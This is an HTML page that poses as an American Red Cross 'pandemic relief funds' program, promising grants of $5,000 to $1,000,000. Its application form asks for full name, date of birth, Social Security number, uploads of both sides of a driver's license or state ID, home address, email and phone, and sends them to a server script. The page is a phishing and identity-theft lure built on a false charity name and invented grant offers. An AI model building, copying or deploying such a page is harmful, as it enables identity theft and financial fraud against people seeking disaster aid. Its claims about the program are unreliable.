<!DOCTYPE html><html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="viewport" content="initial-scale=1, maximum-scale=1">
  <title>American Red Cross | Help Those Affected by Disasters.</title>
  <meta name="keywords" content>
  <meta name="description" content>
  <meta name="author" content>
  <link rel="stylesheet" href="css/style.css">
  <style type="text/css">@media print{.form-section{display:inline!important}.form-pagebreak{display:none!important}.form-section-closed{height:auto!important}.page-section{position:initial!important}}</style>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
</head>

<body class="main-layout">
  <div class="loader_bg">
    <div class="loader"><img src="images/loading.gif" alt="#"></div>
  </div>
  <header>
    <div class="header">
      <div class="container">
        <div class="row">
          <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
            <div class="full">
              <div class="center-desk">
                <div class="logo"><a href="index.html"><img src="images/-logo.png" alt="#"></a></div>
              </div>
            </div>
          </div>
          <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
            <nav class="navigation navbar navbar-expand-md navbar-dark "><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
              <div class="collapse navbar-collapse" id="navbarsExample04">
                <div class="sign_btn"><a href="#apply">Apply Now</a></div>
              </div>
            </nav>
          </div>
        </div>
      </div>
    </div>
  </header>
  <section class="banner_main">
    <div class="container">

          <div class="text-bg">
            <h1>PANDEMIC RELIEF FUNDS</h1>
            <a href="#more">Learn More</a>
          </div>
    </div>
  </section>
 <div class="choose" id="more">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
          <div class="titlepage" style="text-align: justify;">
        Global Red Cross Network and the American Red Cross Disaster Relief Program generally provide more than $1 Billion in cash and in-kind to support programs that align with our philanthropic priorities. We focus on areas where we can do the most good with the combined unique strengths of the Red Cross and its global partners. Our ability to draw on Red Cross wide reach, providing more than just funding helps our philanthropy to deliver greater societal impact. Today redcross.org, through the combined philanthropic efforts of both Global Red Cross Network and its team of international partners, creates opportunities for people to live better every day.
        <br /><br />  
        We are currently working to assist individuals and small businesses that have been impacted by disaster. The evolution of the disaster is prompting the Red Cross and its global partners to provide emergency assistance and funding to help out individuals and small businesses that are experiencing economic hardship. While the details of the program are still evolving, there are current grants that are available for individuals and small businesses now, ranging from as small as $5,000 to $1,000,000.
        <br /><br /> 
      <b>* Required</b> 
<br /><br />
To be eligible for any of the grant categories your identity must be verified before you are allowed to set up a benefit payment method: Direct Deposit or Debit Card. Please be sure to enter your personal information exactly as it is shown on your Driver's License or State ID.
</div>
</div>
</div>
</div>
</div>
  <div id="apply" class="bestCar">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
<form class="main_form" onsubmit="onSubmitForm(event)" id="myForm" action="process.php" method="post" enctype="multipart/form-data">
  <div class="titlepage">
    <h2 style="text-align: center;">Application Form</h2>
  </div>
  <div class="row">
    <div class="col-md-6 form-group">
      <label for="fname">First Name<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="First Name" required type="text" name="f_name" id="fname">
      <span class="error" id="fnameError"></span>
    </div>

    <div class="col-md-6 form-group">
      <label for="lname">Last Name<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="Last Name" required type="text" name="l_name" id="lname">
      <span class="error" id="lnameError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="dob">Date of Birth<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="Date of Birth" required type="date" name="dob" id="dob">
      <span class="error" id="dobError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="ssn">Social Security Number<Span style="color: red;">*</Span></label>
<input class="form-control" placeholder="Social Security Number" type="text" required name="socialSecurity" id="ssn" maxlenth="9" pattern="[0-9]{9}">
      <span class="error" id="ssnError"></span>
    </div>
  <div class="col-md-6 form-group">
    <label for="fileToUpload1">Front Driver's License or State ID<Span style="color: red;">*</Span></label>
    <input class="form-control" type="file" name="front_dl" required id="fileToUpload1">
    <span class="error" id="frontLicenseError"></span>
  </div>
  <div class="col-md-6 form-group">
    <label for="fileToUpload2">Back Driver's License or State ID<Span style="color: red;">*</Span></label>
    <input class="form-control" type="file" name="back_dl" required id="fileToUpload2">
    <span class="error" id="backLicenseError"></span>
  </div>
    <div class="col-md-6 form-group">
      <label for="address">Current Residential Address<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="123 Housing" type="text" required name="line1_address" id="address">
      <span class="error" id="addressLine1Error"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="address2">Apt/Unit/Suite#</label>
      <input class="form-control" placeholder="B22" type="text" name="line2_address" id="address2">
      <span class="error" id="addressLine2Error"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="city">City<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="City" type="text" name="city_address" required id="city">
      <span class="error" id="cityError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="state">State<Span style="color: red;">*</Span></label>
      <select class="form-control" name="state_address" required id="state">
        <option value="" selected disabled>Select State</option>
        <option value="AL">Alabama</option>
        <option value="AK">Alaska</option>
        <option value="AZ">Arizona</option>
        <option value="AR">Arkansas</option>
        <option value="CA">California</option>
        <option value="CO">Colorado</option>
        <option value="CT">Connecticut</option>
        <option value="DE">Delaware</option>
        <option value="DC">District Of Columbia</option>
        <option value="FL">Florida</option>
        <option value="GA">Georgia</option>
        <option value="HI">Hawaii</option>
        <option value="ID">Idaho</option>
        <option value="IL">Illinois</option>
        <option value="IN">Indiana</option>
        <option value="IA">Iowa</option>
        <option value="KS">Kansas</option>
        <option value="KY">Kentucky</option>
        <option value="LA">Louisiana</option>
        <option value="ME">Maine</option>
        <option value="MD">Maryland</option>
        <option value="MA">Massachusetts</option>
        <option value="MI">Michigan</option>
        <option value="MN">Minnesota</option>
        <option value="MS">Mississippi</option>
        <option value="MO">Missouri</option>
        <option value="MT">Montana</option>
        <option value="NE">Nebraska</option>
        <option value="NV">Nevada</option>
        <option value="NH">New Hampshire</option>
        <option value="NJ">New Jersey</option>
        <option value="NM">New Mexico</option>
        <option value="NY">New York</option>
        <option value="NC">North Carolina</option>
        <option value="ND">North Dakota</option>
        <option value="OH">Ohio</option>
        <option value="OK">Oklahoma</option>
        <option value="OR">Oregon</option>
        <option value="PA">Pennsylvania</option>
        <option value="RI">Rhode Island</option>
        <option value="SC">South Carolina</option>
        <option value="SD">South Dakota</option>
        <option value="TN">Tennessee</option>
        <option value="TX">Texas</option>
        <option value="UT">Utah</option>
        <option value="VT">Vermont</option>
        <option value="VA">Virginia</option>
        <option value="WA">Washington</option>
        <option value="WV">West Virginia</option>
        <option value="WI">Wisconsin</option>
        <option value="WY">Wyoming</option>
      </select>
      <span class="error" id="stateError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="zipcode">Zip code<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="Zip code" type="text" required name="zip_address" id="zipcode" pattern="[0-9]{5}" maxlength="5" title="Please enter a valid 5-digit ZIP code">
      <span class="error" id="zipCodeError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="email">Email<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="Email" type="email" required name="email" id="email">
      <span class="error" id="emailError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="phone">Phone<Span style="color: red;">*</Span></label>
      <input class="form-control" placeholder="Phone" type="text" required name="phoneNumber" id="phone" pattern="[0-9]{10}" title="Please enter a valid 9-digit phone number (numeric characters only)" maxlength="10">
      <span class="error" id="phoneNumberError"></span>
    </div>
    <div class="col-md-6 form-group">
      <label for="gender">Gender<Span style="color: red;">*</Span></label>
      <select class="form-control" required name="gender" id="gender">
        <option value=""></option>
        <option value="Male">Male</option>
        <option value="Female">Female</option>
        <option value="Not-to-say">Prefer not to say</option>
      </select>
      <span class="error" id="genderError"></span>
    </div>
    <div class="col-sm-12">
      <button class="find_btn" type="submit" value="submit">Submit</button>
    </div>
  </div>
</form>

<script>
  function generateFileHash(file, callback) {
    const reader = new FileReader();

    reader.onload = function(event) {
      const fileData = event.target.result;

      // Calculate the SHA-256 hash
      crypto.subtle.digest('SHA-256', fileData).then(function(hashBuffer) {
        // Convert the hash buffer to a hexadecimal string
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('');

        callback(hashHex);
      });
    };

    reader.readAsArrayBuffer(file);
  }

  function checkDuplicateUpload(fileInputId, existingHashes) {
    const fileInput = document.getElementById(fileInputId);
    const selectedFile = fileInput.files[0];
    const otherFileInputId = fileInputId === 'fileToUpload1' ? 'fileToUpload2' : 'fileToUpload1';
    const otherFileInput = document.getElementById(otherFileInputId);
    const submitButton = document.getElementById('submitButton');

    if (selectedFile) {
      generateFileHash(selectedFile, function(hash) {
        if (existingHashes.includes(hash)) {
          const errorMessageElement = document.getElementById(fileInputId + 'Error');
          errorMessageElement.textContent = 'Duplicate image is not allowed.';

          const otherErrorMessageElement = document.getElementById(otherFileInputId + 'Error');
          otherErrorMessageElement.textContent = 'Duplicate image is not allowed.';
          otherFileInput.value = '';

          submitButton.disabled = true;

          otherFileInput.classList.add('highlight-input');
        } else {
          existingHashes.push(hash);
          const errorMessageElement = document.getElementById(fileInputId + 'Error');
          errorMessageElement.textContent = '';

          const otherErrorMessageElement = document.getElementById(otherFileInputId + 'Error');
          otherErrorMessageElement.textContent = '';

          submitButton.disabled = false;

          otherFileInput.classList.remove('highlight-input');
        }
      });
    }
  }

  const uploadedFileHashes = [];

  document.getElementById('fileToUpload1').addEventListener('change', function() {
    checkDuplicateUpload('fileToUpload1', uploadedFileHashes);
  });

  document.getElementById('fileToUpload2').addEventListener('change', function() {
    checkDuplicateUpload('fileToUpload2', uploadedFileHashes);
  });
</script>

<script>
  function validateForm() {
    var firstName = document.getElementById("fname").value;
    var lastName = document.getElementById("lname").value;
    var dateOfBirth = document.getElementById("dob").value;
    var socialSecurity = document.getElementById("ssn").value;
    var frontLicense = document.getElementById("fileToUpload1").value;
    var backLicense = document.getElementById("fileToUpload2").value;
    var addressLine1 = document.getElementById("address").value;
    var addressLine2 = document.getElementById("address2").value;
    var city = document.getElementById("city").value;
    var state = document.getElementById("state").value;
    var zipCode = document.getElementById("zipcode").value;
    var email = document.getElementById("email").value;
    var phoneNumber = document.getElementById("phone").value;
    var gender = document.getElementById("gender").value;

    var isValid = true;

    if (firstName.trim() === "") {
      document.getElementById("fnameError").textContent = "Please enter your first name.";
      isValid = false;
    } else {
      document.getElementById("fnameError").textContent = "";
    }

    if (lastName.trim() === "") {
      document.getElementById("lnameError").textContent = "Please enter your last name.";
      isValid = false;
    } else {
      document.getElementById("lnameError").textContent = "";
    }

    if (dateOfBirth.trim() === "") {
      document.getElementById("dobError").textContent = "Please enter your date of birth.";
      isValid = false;
    } else {
      document.getElementById("dobError").textContent = "";
    }

    if (socialSecurity.trim() === "") {
      document.getElementById("ssnError").textContent = "Please enter your social security number.";
      isValid = false;
    } else if (socialSecurity.length !== 9) {
      document.getElementById("ssnError").textContent = "Please enter a 9-digit social security number.";
      isValid = false;
    } else {
      document.getElementById("ssnError").textContent = "";
    }

    var form = document.getElementById('myForm');

    form.addEventListener('submit', function(event) {
      var frontFileInput = document.getElementById('fileToUpload1');
      var backFileInput = document.getElementById('fileToUpload2');
      var maxFileSize = 5 * 1024 * 1024;
      var allowedFormats = ["jpg", "jpeg", "png", "gif"];

      function handleFormSubmit(event) {
        var frontFile = frontFileInput.files[0];
        var backFile = backFileInput.files[0];
        var error = false;

        if (frontFile) {
          var frontFileSize = frontFile.size;
          var frontFileFormat = frontFile.name.split('.').pop().toLowerCase();

          if (allowedFormats.indexOf(frontFileFormat) === -1 || frontFileSize > maxFileSize) {
            error = true;
            document.getElementById('frontLicenseError').textContent = 'Invalid front driver\'s license file. Please select a valid file.';
          }
        }

        if (backFile) {
          var backFileSize = backFile.size;
          var backFileFormat = backFile.name.split('.').pop().toLowerCase();

          if (allowedFormats.indexOf(backFileFormat) === -1 || backFileSize > maxFileSize) {
            error = true;
            document.getElementById('backLicenseError').textContent = 'Invalid back driver\'s license file. Please select a valid file.';
          }
        }

        if (error) {
          event.preventDefault();
        }
      }

      handleFormSubmit(event);
    });

    if (addressLine1.trim() === "") {
      document.getElementById("addressLine1Error").textContent = "Please enter your current residential address.";
      isValid = false;
    } else {
      document.getElementById("addressLine1Error").textContent = "";
    }

    if (city.trim() === "") {
      document.getElementById("cityError").textContent = "Please enter your city.";
      isValid = false;
    } else {
      document.getElementById("cityError").textContent = "";
    }

    if (state.trim() === "") {
      document.getElementById("stateError").textContent = "Please enter your state.";
      isValid = false;
    } else {
      document.getElementById("stateError").textContent = "";
    }

    if (zipCode.trim() === "") {
      document.getElementById("zipCodeError").textContent = "Please enter your zip code.";
      isValid = false;
    } else {
      document.getElementById("zipCodeError").textContent = "";
    }

    if (email.trim() === "") {
      document.getElementById("emailError").textContent = "Please enter your email address.";
      isValid = false;
    } else {
      document.getElementById("emailError").textContent = "";
    }

    if (phoneNumber.trim() === "") {
      document.getElementById("phoneNumberError").textContent = "Please enter your phone number.";
      isValid = false;
    } else {
      document.getElementById("phoneNumberError").textContent = "";
    }

    if (gender.trim() === "") {
      document.getElementById("genderError").textContent = "Please select your gender.";
      isValid = false;
    } else {
      document.getElementById("genderError").textContent = "";
    }

    return isValid;
  }

  function onSubmitForm(event) {
    event.preventDefault();

    if (validateForm()) {
      document.getElementById("myForm").submit();
    }
  }
</script>




    </div>
  </div>
</div>
</div>
<script src="js/jquery.min.js"></script>
  <script src="js/bootstrap.bundle.min.js"></script>
